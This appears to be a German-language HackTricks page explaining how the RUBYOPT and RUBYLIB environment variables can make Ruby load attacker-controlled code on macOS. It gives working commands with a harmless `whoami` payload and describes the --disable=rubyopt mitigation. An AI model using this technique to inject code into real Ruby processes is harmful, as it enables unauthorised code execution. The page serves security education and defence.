# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby liest unterstützte Kommandozeilenoptionen aus der Umgebungsvariable `RUBYOPT`, bevor ein Script ausgeführt wird. Ruby lehnt die Codeausführung über `-e` in `RUBYOPT` ab, aber `-I` kann ein Verzeichnis an den Anfang der Library-Suche setzen und `-r` kann eine Library laden. Ein Prozess, der Ruby mit vom Angreifer kontrollierten Umgebungsvariablen startet, kann daher dazu gebracht werden, vom Angreifer kontrollierten Ruby-Code zu laden.<sup>[[1]](#references)</sup>

Erstelle `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Erstelle ein harmloses Ruby-Skript wie `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Führen Sie es mit einem kontrollierten `RUBYOPT`-Wert aus:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Um dieses Verhalten zu deaktivieren, übergib `--disable=rubyopt` (oder `--disable-rubyopt`) **vor** dem Namen des Skripts:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Eine Option, die nach `hello.rb` angegeben wird, wird dem Skript in `ARGV` übergeben; sie deaktiviert nicht die vorherige Verarbeitung von `RUBYOPT`.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## RUBYLIB

Anstatt das Load-Verzeichnis mit `-I` innerhalb von `RUBYOPT` voranzustellen, fügt die separate Umgebungsvariable `RUBYLIB` Verzeichnisse zu Rubys `$LOAD_PATH` hinzu. In Kombination mit `RUBYOPT=-r<module>` wird der Code des Angreifers geladen, ohne dass `-I` in `RUBYOPT` benötigt wird:<sup>[[1]](#references)</sup>
```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```
## References

- [1] [Ruby-Dokumentation – Ruby-Befehlszeilenoptionen](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
